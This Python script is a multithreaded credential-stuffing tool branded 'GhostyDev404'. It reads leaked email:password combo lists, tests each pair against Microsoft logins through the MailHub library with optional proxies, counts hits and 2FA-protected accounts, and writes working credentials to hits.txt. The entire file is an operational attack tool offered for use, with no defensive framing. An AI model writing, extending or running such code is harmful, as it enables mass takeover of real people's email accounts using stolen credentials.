import os
import sys
from datetime import datetime
from mailhub import MailHub
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

print_lock = Lock()
file_lock = Lock()
stats_lock = Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_valid_combo(line):
    """Validate if a line is a proper email:pass format"""
    line = line.strip()
    
    # Skip empty lines
    if not line:
        return False
    
    # Skip obvious spam/invalid lines
    spam_indicators = [
        'telegram', 't.me', 'discord', 'http://', 'https://',
        '___By@', 'C--l--o--u--d', '!!!', 'H--O--T--M--A--I--L',
        '(ow)z', 'BACK_UP', '##', '@@', '__', '--'
    ]
    
    line_lower = line.lower()
    if any(indicator.lower() in line_lower for indicator in spam_indicators):
        return False
    
    # Must contain exactly one colon
    if line.count(':') != 1:
        return False
    
    # Split and validate
    parts = line.split(':', 1)
    if len(parts) != 2:
        return False
    
    email, password = parts
    email = email.strip()
    password = password.strip()
    
    # Email must have @ and be reasonable length
    if '@' not in email or len(email) < 3:
        return False
    
    # Password must exist and be reasonable
    if not password or len(password) < 1:
        return False
    
    # Email should only contain valid characters
    valid_email_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-+')
    if not all(c in valid_email_chars for c in email):
        return False
    
    return True

def load_combos(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            all_lines = [line.strip() for line in f if line.strip()]
        
        # Filter valid combos
        combos = [line for line in all_lines if is_valid_combo(line)]
        
        # Remove duplicates while preserving order
        seen = set()
        unique_combos = []
        for combo in combos:
            if combo not in seen:
                seen.add(combo)
                unique_combos.append(combo)
        
        invalid_count = len(all_lines) - len(combos)
        duplicate_count = len(combos) - len(unique_combos)
        
        if invalid_count > 0:
            print(f"{Colors.YELLOW}[!] Removed {invalid_count} invalid lines (not email:pass format){Colors.RESET}")
        if duplicate_count > 0:
            print(f"{Colors.YELLOW}[!] Removed {duplicate_count} duplicate combos{Colors.RESET}")
        
        return unique_combos
    except FileNotFoundError:
        print(f"{Colors.RED}[ERROR] File '{filename}' not found!{Colors.RESET}")
        print(f"{Colors.YELLOW}[INFO] Creating empty combos.txt file...{Colors.RESET}")
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("")
        return []
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Failed to read file: {str(e)}{Colors.RESET}")
        return []

def save_result(filename, content):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            with file_lock:
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(content + '\n')
                    f.flush()
                    os.fsync(f.fileno())
            return True
        except Exception as e:
            if attempt == max_retries - 1:
                with print_lock:
                    print(f"\n{Colors.RED}[ERROR] Failed to save result after {max_retries} attempts: {str(e)}{Colors.RESET}")
            time.sleep(0.1)
    return False

def check_account(checker, email, password, proxy=None):
    try:
        result = checker.loginMICROSOFT(email, password, proxy)
        
        if result[0] == "ok":
            return "HIT", result[1] if len(result) > 1 else None
        elif result[0] == "nfa":
            return "2FA", None
        elif result[0] == "custom":
            return "CUSTOM", None
        elif result[0] == "fail":
            return "BAD", None
        else:
            return "BAD", None
            
    except Exception as e:
        return "BAD", str(e)

def print_banner():
    ghosty = f"""
{Colors.MAGENTA}{Colors.BOLD}  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗   ██╗██████╗ ███████╗██╗   ██╗██╗  ██╗ ██████╗ ██╗  ██╗
{Colors.MAGENTA} ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝██║   ██║██║  ██║██╔═████╗██║  ██║
{Colors.MAGENTA} ██║  ███╗███████║██║   ██║███████╗   ██║    ╚████╔╝ ██║  ██║█████╗  ██║   ██║███████║██║██╔██║███████║
{Colors.MAGENTA} ██║   ██║██╔══██║██║   ██║╚════██║   ██║     ╚██╔╝  ██║  ██║██╔══╝  ╚██╗ ██╔╝╚════██║████╔╝██║╚════██║
{Colors.MAGENTA} ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║      ██║   ██████╔╝███████╗ ╚████╔╝      ██║╚██████╔╝     ██║
{Colors.MAGENTA}  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚═════╝ ╚══════╝  ╚═══╝       ╚═╝ ╚═════╝      ╚═╝{Colors.RESET}
"""
    
    print(ghosty)

def print_stats_line(stats, start_time):
    with stats_lock:
        elapsed = time.time() - start_time
        cpm = (stats['checked'] / elapsed * 60) if elapsed > 0 else 0
        progress_pct = (stats['checked'] / stats['total'] * 100) if stats['total'] > 0 else 0
        
        # Progress bar
        bar_width = 30
        filled = int(bar_width * stats['checked'] / stats['total']) if stats['total'] > 0 else 0
        bar = f"{Colors.GREEN}{'█' * filled}{Colors.WHITE}{'░' * (bar_width - filled)}{Colors.RESET}"
        
        line = (f"\r{Colors.BOLD}[{bar}]{Colors.RESET} {progress_pct:.1f}% | "
                f"{Colors.CYAN}Checked: {stats['checked']}/{stats['total']}{Colors.RESET} | "
                f"{Colors.GREEN}✓ Hits: {stats['hits']}{Colors.RESET} | "
                f"{Colors.YELLOW}🔒 2FA: {stats['2fa']}{Colors.RESET} | "
                f"{Colors.MAGENTA}⚡ Custom: {stats['custom']}{Colors.RESET} | "
                f"{Colors.RED}✗ Bad: {stats['bad']}{Colors.RESET} | "
                f"{Colors.CYAN}⚡ {cpm:.0f} CPM{Colors.RESET}")
        print(line, end='', flush=True)

def process_combo(combo, proxy, index, total, stats, start_time):
    checker = None
    try:
        email, password = combo.split(':', 1)
        checker = MailHub()
        
        status, extra = check_account(checker, email, password, proxy)
        
        with stats_lock:
            stats['checked'] += 1
            
            result_line = f'{combo}'
            
            if status == "HIT":
                stats['hits'] += 1
                save_result('hits.txt', result_line)
                
            elif status == "2FA":
                stats['2fa'] += 1
                
            elif status == "CUSTOM":
                stats['custom'] += 1
                
            elif status == "BAD":
                stats['bad'] += 1
        
        print_stats_line(stats, start_time)
            
    except ValueError:
        with stats_lock:
            stats['bad'] += 1
        print_stats_line(stats, start_time)
    except Exception as e:
        with stats_lock:
            stats['bad'] += 1
        print_stats_line(stats, start_time)
    finally:
        if checker:
            del checker

def run_checker():
    clear_screen()
    print_banner()
    
    combo_file = "combos.txt"
    
    print(f"{Colors.CYAN}┌{'─' * 58}┐{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}LOADING CONFIGURATION{Colors.RESET}{' ' * 36}{Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}└{'─' * 58}┘{Colors.RESET}\n")
    
    print(f"{Colors.BLUE}[⏳] Loading combos from {combo_file}...{Colors.RESET}")
    combos = load_combos(combo_file)
    
    if not combos:
        print(f"{Colors.RED}[✗] No valid combos found in combos.txt{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Please add your combos in email:pass format and run again{Colors.RESET}")
        input(f"\n{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        return
    
    print(f"{Colors.GREEN}[✓] Loaded {len(combos)} valid combos{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}┌{'─' * 58}┐{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}CHECKER SETTINGS{Colors.RESET}{' ' * 41}{Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}└{'─' * 58}┘{Colors.RESET}\n")
    
    threads_input = input(f"{Colors.YELLOW}⚙  Number of threads (1-200, default 10): {Colors.RESET}").strip()
    try:
        threads = int(threads_input) if threads_input else 10
        threads = max(1, min(threads, 200))
    except ValueError:
        threads = 10
    
    print(f"{Colors.GREEN}[✓] Using {threads} threads{Colors.RESET}")
    
    use_proxy = input(f"{Colors.YELLOW}🌐 Use proxies? (y/n): {Colors.RESET}").strip().lower()
    proxy = None
    
    if use_proxy == 'y':
        proxy_input = input(f"{Colors.YELLOW}🔗 Enter proxy (http://ip:port): {Colors.RESET}").strip()
        if proxy_input:
            proxy = {
                'http': proxy_input,
                'https': proxy_input
            }
            print(f"{Colors.GREEN}[✓] Proxy configured{Colors.RESET}")
    
    stats = {
        'total': len(combos),
        'checked': 0,
        'hits': 0,
        '2fa': 0,
        'custom': 0,
        'bad': 0
    }
    
    print(f"\n{Colors.CYAN}┌{'─' * 58}┐{Colors.RESET}")
    print(f"{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}CHECKING IN PROGRESS{Colors.RESET}{' ' * 37}{Colors.CYAN}│{Colors.RESET}")
    print(f"{Colors.CYAN}└{'─' * 58}┘{Colors.RESET}\n")
    
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i, combo in enumerate(combos, 1):
                future = executor.submit(
                    process_combo, 
                    combo, 
                    proxy, 
                    i, 
                    stats['total'], 
                    stats,
                    start_time
                )
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Checker stopped by user{Colors.RESET}")
    
    end_time = time.time()
    elapsed = end_time - start_time
    cpm = (stats['checked'] / elapsed * 60) if elapsed > 0 else 0
    
    print(f"\n\n{Colors.GREEN}{Colors.BOLD}✓ CHECKING COMPLETE!{Colors.RESET}\n")
    
    if stats['hits'] > 0:
        print(f"{Colors.GREEN}[✓] Hits saved to: hits.txt{Colors.RESET}")
    
    input(f"\n{Colors.WHITE}Press Enter to exit...{Colors.RESET}")

if __name__ == "__main__":
    try:
        run_checker()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program terminated by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] Unexpected error: {str(e)}{Colors.RESET}")
        input(f"{Colors.WHITE}Press Enter to exit...{Colors.RESET}")
        sys.exit(1)